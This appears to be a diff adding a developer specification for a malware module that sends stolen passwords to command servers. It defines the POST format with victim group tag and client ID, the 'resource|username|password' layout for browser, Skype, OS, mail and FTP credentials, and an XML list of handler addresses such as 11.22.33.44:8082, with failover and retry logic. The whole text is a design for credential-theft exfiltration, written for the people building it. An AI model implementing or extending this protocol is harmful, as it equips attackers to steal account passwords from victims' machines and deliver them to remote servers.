@@ -1,0 +1,69 @@
+2 Data is sent to the server via HTTP POST requests.  There can be as many reverse-proxies, load-balancer and DNATs between the server and the client as you want. So, there is no way to know the ip-address of the client.
+2.1 Each request has three components in the URI separated by "/": group tag, client id.  Each POST has the following URI:
+/<group-tag>/<clientid>/81/.
+where group-tag - group tag, clientid - client id, 81 - code denoting the data type.
+2.1.1 The group-tag is an arbitrary string consisting of characters (a-z) and numbers (0-9). The parameter is not case sensitive.
+The module gets it from the higher logic (function Start, const ParentInfo* pParentData, pParentData->ParentGroup).
+2.1.2 Client Id is a string.
+The module gets it from the higher logic (function Start, const ParentInfo* pParentData, pParentData->ParentID
+2.2 Each server's response can have the following HTTP-codes: 200 and 403. Response 200 always has a body with the content "/1/" (content-type: text/plain), while response 403 is used if a non POST request is sent, the POST body has an unknown format or fields, an unknown format URI, or an incorrect format clientid.
+3 POST request has a multipart/form-data format body. And has the following fields:
+
+source - data source description. For example, if it is data from Skype, it should be something like "skype passwords", from OS - "OS passwords". And so on and so forth.
+data - long text in UTF8 encoding.
+
+Each line is intended for a separate password, and consists of three fields, separated by a vertical line and ending with the end-of-line character \n:
+
+resource|username|password\n
+
+If you collect passwords from browsers, the resource is a url.
+For example, for a browser, the premise might be something like
+
+http://gmx.com|jack|secretpassword\n
+http://yahoo.com|jack|secretpassword1\n
+http://somesite.com|jack2|secretpassword2\n
+
+Since passwords can be collected from different sources, the area field must contain the identifier of the resource protected by the password.
+For Skype this would be
+
+skype|jack|jackass\n
+
+For OS - a separate line for each user's profile
+
+os|jack|hijack\n
+os|john|hijohn\n
+
+For mail it will be the name of the pop3/imap server - if appropriate and it can be grabbed; if not, it just duplicates the mail address
+for ftp it will be a url, like ftp://ftp.com
+
+
+etc.
+
+3. A config with a list of addresses to send data is given to the module by calling Control() with arguments:
+Ctl = "dpost"
+CtlArg = "config contents"
+
+3.1 The config is a simple xml in the following format:
+
+<dpost>
+<handler>http://11.22.33.44:8082</handler>
+<handler>127.0.0.1:8083</handler>
+</dpost>
+
+The http/https prefix to the handler is optional. If it is specified, you should work with the specified protocol.
+If it is not specified:
+- if the port value is even, it works without encryption (HTTP), if the port is odd, it works over SSL/TLS (HTTPS).
+
+3.2 Sending data is organized as follows:
+- the first url in the list is chosen
+- request uri is pasted to it. The final url will be (for the given in the example config), for example, the following
+
+  http://11.22.33.44:8082/group_id/client_id/81
+
+- http-request is executed, the server response is received
+- if there was an error during the request (no server response or no response code 200), the next url is selected from the config
+- if sending is successful, the exit from the sending cycle is performed and the procedure is terminated
+- in case of unsuccessful sending to all the addresses given in the configuration, there are 2 options:
+  - pause for a minute, then retry
+  - terminate the cycle and exit the procedure
+This solution is left to the developer's discretion.
